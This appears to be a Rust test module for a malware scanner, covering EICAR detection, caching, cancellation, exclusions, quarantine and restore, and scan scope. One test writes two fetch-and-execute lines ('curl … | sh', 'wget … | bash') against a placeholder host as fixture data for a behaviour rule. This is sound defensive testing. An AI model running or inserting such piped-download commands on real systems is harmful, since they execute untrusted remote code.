        let mut cache = ScanCache::new();
        let mut context = ScanContext {
            detector: &detector,
            hashes: &hashes,
            startup: &inventory,
            cache: &mut cache,
            exclusions: Vec::new(),
            max_file_bytes: QUICK_FILE_LIMIT,
            include_startup: true,
        };
        let target = ScanTarget::Paths(strings_for(paths));
        let progress = Progress::new();
        let cancel = CancelToken::new();
        run(&target, &mut context, &progress, &cancel).expect("the scan runs")
    }

    #[test]
    fn a_known_bad_file_is_found_and_named() {
        let fixture = Fixture::new("eicar");
        let infected = fixture.write("eicar.com", EICAR.as_bytes());
        let report = scan_paths(std::slice::from_ref(&infected));
        assert_eq!(
            report.confirmed(),
            1,
            "the EICAR file should be one confirmed finding: {:?}",
            report
                .findings
                .iter()
                .map(|f| (&f.name, f.confidence))
                .collect::<Vec<_>>()
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.confidence == Confidence::Confirmed)
            .unwrap();
        assert_eq!(finding.path.as_ref().unwrap(), &infected);
        assert!(finding.title.contains("EICAR"), "{}", finding.title);
        assert!(finding.sha256.is_some(), "a hash hit records the hash");
        fixture.cleanup();
    }

    #[test]
    fn scanning_never_removes_or_alters_a_file() {
        let fixture = Fixture::new("read-only");
        let infected = fixture.write("eicar.com", EICAR.as_bytes());
        let innocent = fixture.write("notes.txt", b"just a note");
        let before = std::fs::read(&infected).unwrap();
        scan_paths(&[infected.clone(), innocent.clone()]);
        assert!(infected.is_file(), "a scan must not move what it found");
        assert_eq!(std::fs::read(&infected).unwrap(), before);
        assert!(innocent.is_file());
        fixture.cleanup();
    }

    #[test]
    fn a_clean_tree_reports_nothing() {
        let fixture = Fixture::new("clean");
        let file = fixture.write("sub/keep.dylib", b"an ordinary library-ish file");
        let report = scan_paths(&[file]);
        assert_eq!(report.findings.len(), 0, "{:?}", report.findings);
        assert!(report.examined >= 1, "the file should have been looked at");
        fixture.cleanup();
    }

    #[test]
    fn a_denied_folder_is_reported_as_unchecked_not_as_clean() {
        let fixture = Fixture::new("coverage");
        let file = fixture.write("payload.dylib", b"harmless");
        let missing = fixture.root.join("no-such-folder");
        let report = scan_paths(&[file.clone(), missing.clone()]);
        // The missing folder is `absent`, which is a fact, not a gap.
        assert!(
            report.coverage.complete(),
            "a folder that was never there is not a gap"
        );
        let record = report
            .coverage
            .roots
            .iter()
            .find(|root| root.path == missing)
            .expect("the missing folder is still listed");
        assert_eq!(record.outcome, RootOutcome::Absent);
        fixture.cleanup();
    }

    #[test]
    fn a_second_scan_of_unchanged_files_hits_the_cache() {
        let fixture = Fixture::new("cache");
        let infected = fixture.write("eicar.com", EICAR.as_bytes());
        let inventory = StartupInventory::default();
        let detector = Detector::builtin().unwrap();
        let hashes = HashIndex::builtin();
        let mut cache = ScanCache::new();

        let first = {
            let mut context = ScanContext {
                detector: &detector,
                hashes: &hashes,
                startup: &inventory,
                cache: &mut cache,
                exclusions: Vec::new(),
                max_file_bytes: QUICK_FILE_LIMIT,
                include_startup: true,
            };
            let report = run(
                &ScanTarget::Paths(strings_for(std::slice::from_ref(&infected))),
                &mut context,
                &Progress::new(),
                &CancelToken::new(),
            )
            .unwrap();
            context.cache.commit();
            report
        };
        let second = {
            let mut context = ScanContext {
                detector: &detector,
                hashes: &hashes,
                startup: &inventory,
                cache: &mut cache,
                exclusions: Vec::new(),
                max_file_bytes: QUICK_FILE_LIMIT,
                include_startup: true,
            };
            run(
                &ScanTarget::Paths(strings_for(std::slice::from_ref(&infected))),
                &mut context,
                &Progress::new(),
                &CancelToken::new(),
            )
            .unwrap()
        };
        assert_eq!(first.cached, 0, "the first scan can have learned nothing");
        assert_eq!(second.cached, 1, "the second scan must reuse the verdict");
        assert_eq!(
            first.findings.len(),
            second.findings.len(),
            "a cached verdict must report the same finding"
        );
        assert_eq!(
            second.findings[0].evidence.len(),
            first.findings[0].evidence.len()
        );
        fixture.cleanup();
    }

    #[test]
    fn a_cancelled_scan_reports_itself_as_incomplete() {
        let fixture = Fixture::new("cancel");
        for index in 0..80 {
            fixture.write(&format!("deep/file-{index}.dylib"), b"payload");
        }
        let inventory = StartupInventory::default();
        let detector = Detector::builtin().unwrap();
        let hashes = HashIndex::builtin();
        let mut cache = ScanCache::new();
        let mut context = ScanContext {
            detector: &detector,
            hashes: &hashes,
            startup: &inventory,
            cache: &mut cache,
            exclusions: Vec::new(),
            max_file_bytes: QUICK_FILE_LIMIT,
            include_startup: true,
        };
        let cancel = CancelToken::new();
        cancel.cancel();
        let report = run(
            &ScanTarget::Paths(strings_for(std::slice::from_ref(&fixture.root))),
            &mut context,
            &Progress::new(),
            &cancel,
        )
        .expect("a cancelled scan still returns a report");
        assert!(report.cancelled, "the report must say it was cancelled");
        fixture.cleanup();
    }

    #[test]
    fn an_excluded_folder_is_neither_walked_nor_blamed() {
        let fixture = Fixture::new("exclude");
        let hidden = fixture.write("vendor/eicar.com", EICAR.as_bytes());
        let kept = fixture.write("mine.dylib", b"payload");
        let inventory = StartupInventory::default();
        let detector = Detector::builtin().unwrap();
        let hashes = HashIndex::builtin();
        let mut cache = ScanCache::new();
        let mut context = ScanContext {
            detector: &detector,
            hashes: &hashes,
            startup: &inventory,
            cache: &mut cache,
            exclusions: vec![hidden.parent().unwrap().to_path_buf()],
            max_file_bytes: QUICK_FILE_LIMIT,
            include_startup: true,
        };
        let report = run(
            &ScanTarget::Paths(strings_for(std::slice::from_ref(&fixture.root))),
            &mut context,
            &Progress::new(),
            &CancelToken::new(),
        )
        .unwrap();
        assert!(
            report
                .findings
                .iter()
                .all(|finding| finding.path.as_ref() != Some(&hidden)),
            "an excluded path must not produce findings"
        );
        let _ = kept;
        fixture.cleanup();
    }

    #[test]
    fn a_finding_can_be_quarantined_by_id_and_nothing_else() {
        let _guard = crate::state_guard("scan-quarantine");
        let fixture = Fixture::new("quarantine");
        let infected = fixture.write("eicar.com", EICAR.as_bytes());
        let report = scan_paths(std::slice::from_ref(&infected));
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.confidence == Confidence::Confirmed)
            .expect("EICAR is confirmed");

        let mut quarantine = Quarantine::new();
        let entry = quarantine
            .quarantine(finding)
            .expect("a confirmed finding from this scan can be quarantined");
        assert!(!infected.exists(), "the file moved out of the way");
        assert!(entry.sha256.len() == 64);

        quarantine.restore(&entry.id).unwrap();
        assert_eq!(
            std::fs::read(&infected).unwrap(),
            EICAR.as_bytes(),
            "restore puts the same bytes back"
        );
        fixture.cleanup();
    }

    #[test]
    fn a_behaviour_match_is_never_reported_as_confirmed() {
        let fixture = Fixture::new("behaviour");
        // Two piped-download lines: the behaviour rule fires, but nothing about
        // this file has ever been published as bad.
        let scripted = fixture.write(
            "setup.dylib",
            b"curl -sS https://example.test/a | sh\nwget -qO- https://example.test/b | bash\n",
        );
        let report = scan_paths(&[scripted]);
        let hits: Vec<&Finding> = report
            .findings
            .iter()
            .filter(|finding| {
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key() == "yara:ShellPayloadInUserData")
            })
            .collect();
        assert_eq!(hits.len(), 1, "the behaviour rule should fire once");
        assert_eq!(
            hits[0].confidence,
            Confidence::Suspicious,
            "behaviour evidence may not claim confirmation"
        );
        assert_eq!(report.confirmed(), 0);
        fixture.cleanup();
    }

    #[test]
    fn finding_ids_are_unique_and_stable_within_a_scan() {
        let fixture = Fixture::new("ids");
        let one = fixture.write("a/eicar.com", EICAR.as_bytes());
        let two = fixture.write("b/eicar.com", EICAR.as_bytes());
        let report = scan_paths(&[one, two]);
        let ids: Vec<&str> = report
            .findings
            .iter()
            .filter(|finding| finding.confidence == Confidence::Confirmed)
            .map(|finding| finding.id.as_str())
            .collect();
        assert_eq!(ids.len(), 2, "both copies are reported");
        assert_ne!(ids[0], ids[1], "two files are two ids");
        fixture.cleanup();
    }

    /// A custom scan means the paths that were named. The login-item inventory
    /// covers the whole machine, and mixing its answers into a folder scan buries
    /// the one result the person asked for.
    #[test]
    fn a_custom_scan_reports_only_what_it_was_pointed_at() {
        let fixture = Fixture::new("scoped");
        let infected = fixture.write("eicar.com", EICAR.as_bytes());
        // A login agent living outside the scanned folder, so its finding can
        // only appear when the inventory is part of the scan.
        let agent = fixture.sibling("thing.dylib");

        let inventory = StartupInventory {
            items: vec![{
                let mut item = StartupItem::new(
                    "/Users/tester/Library/LaunchAgents/com.example.thing.plist",
                    "thing",
                    squid_platform::startup::StartupSource::LaunchAgent,
                    squid_platform::startup::StartupScope::User,
                );
                item.command = agent.to_string_lossy().into_owned();
                item.program = Some(agent.clone());
                item
            }],
            notes: Vec::new(),
        };
        let detector = Detector::builtin().unwrap();
        let hashes = HashIndex::builtin();

        let scoped = run_with(&inventory, &detector, &hashes, false, &fixture.root);
        assert_eq!(
            scoped.findings.len(),
            1,
            "a folder scan answers about that folder: {:?}",
            scoped
                .findings
                .iter()
                .map(|finding| finding.display_path.clone())
                .collect::<Vec<_>>()
        );
        assert_eq!(scoped.confirmed(), 1);
        assert_eq!(scoped.system_advisories.len(), 0);
        assert_eq!(
            scoped.findings[0].path.as_deref(),
            Some(infected.as_path()),
            "the one finding is the file inside the folder"
        );

        let wide = run_with(&inventory, &detector, &hashes, true, &fixture.root);
        assert!(
            wide.findings.len() > scoped.findings.len(),
            "with the inventory in scope, the login agent is reported too: {:?}",
            wide.findings
                .iter()
                .map(|finding| &finding.name)
                .collect::<Vec<_>>()
        );
        assert!(
            wide.findings
                .iter()
                .any(|finding| finding.path.as_deref() == Some(agent.as_path())),
            "the login agent outside the folder is reported when the inventory is in scope"
        );
        fixture.cleanup();
    }

    fn run_with(
        inventory: &StartupInventory,
        detector: &Detector,
        hashes: &HashIndex,
        include_startup: bool,
        root: &Path,
    ) -> ScanReport {
        let mut cache = ScanCache::new();
        let mut context = ScanContext {
            detector,
            hashes,
            startup: inventory,
            cache: &mut cache,
            exclusions: Vec::new(),
            max_file_bytes: QUICK_FILE_LIMIT,
            include_startup,
        };
        run(
            &ScanTarget::Paths(strings_for(&[root.to_path_buf()])),
            &mut context,
            &Progress::new(),
            &CancelToken::new(),
        )
        .unwrap()
    }

    #[test]
    fn a_quick_scan_stops_at_a_bundle_s_own_executable() {
        // What a quick scan must read: the persistence surface, and the program
        // each bundle runs.
        assert!(quick_scope_allows(Path::new(
            "/Applications/Thing.app/Contents/MacOS/Thing"
        )));
        assert!(quick_scope_allows(Path::new(
            "/Applications/Thing.app/Contents/Info.plist"
        )));
        assert!(quick_scope_allows(Path::new(
            "/Library/LaunchAgents/com.tester.thing.plist"
        )));
        assert!(quick_scope_allows(Path::new(
            "/Users/tester/Downloads/setup.exe"
        )));
        assert!(quick_scope_allows(Path::new(
            "/Users/tester/Library/Application Support/Thing/thing.dylib"
        )));
        // A nested bundle counts as its own: it is separately startable.
        assert!(quick_scope_allows(Path::new(
            "/Applications/Thing.app/Contents/Helpers/Helper.app/Contents/MacOS/Helper"
        )));

        // What it must not: the vendor's frameworks and resources, which are the
        // difference between seconds and minutes on a real /Applications.
        assert!(!quick_scope_allows(Path::new(
            "/Applications/Thing.app/Contents/Frameworks/Whatever.framework/Versions/A/Whatever"
        )));
        assert!(!quick_scope_allows(Path::new(
            "/Applications/Thing.app/Contents/Resources/app.asar"
        )));
        assert!(!quick_scope_allows(Path::new(
            "/Applications/Thing.app/Contents/Resources/en.lproj/Main.strings"
        )));
        // A folder merely called Contents is not a bundle.
        assert!(quick_scope_allows(Path::new("/Users/tester/Contents/tool")));
    }

    #[test]
    fn the_roots_a_scan_names_are_the_roots_the_ui_promises() {
        let quick = quick_roots();
        assert!(quick.iter().any(|root| root == Path::new("/Applications")) || cfg!(windows));
        let home = squid_platform::startup::home_dir();
        assert!(quick.contains(&home.join("Downloads")));
        // A full scan is a superset: it must never cover less than a quick one.
        let full = full_roots();
        for root in &quick {
            assert!(full.contains(root), "full scan lost {}", root.display());
        }
        assert!(full.len() > quick.len());
    }
}
